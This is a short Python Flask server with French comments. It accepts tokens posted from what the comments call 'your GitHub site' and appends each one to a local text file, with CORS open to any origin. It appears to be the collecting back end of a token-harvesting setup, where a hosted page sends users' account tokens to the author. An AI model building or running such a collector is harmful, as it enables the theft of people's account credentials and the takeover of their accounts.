from flask import Flask, request
from flask_cors import CORS # Très important !

app = Flask(__name__)
CORS(app) # Cela permet à ton site GitHub d'envoyer les données ici

@app.route('/save-token', methods=['POST'])
def save_token():
    data = request.get_json()
    token = data.get('token')
    if token:
        # On enregistre le token dans ton fichier 1.txt
        with open("1.txt", "a") as f:
            f.write(f"{token}\n")
        return {"status": "ok"}, 200
    return {"status": "error"}, 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
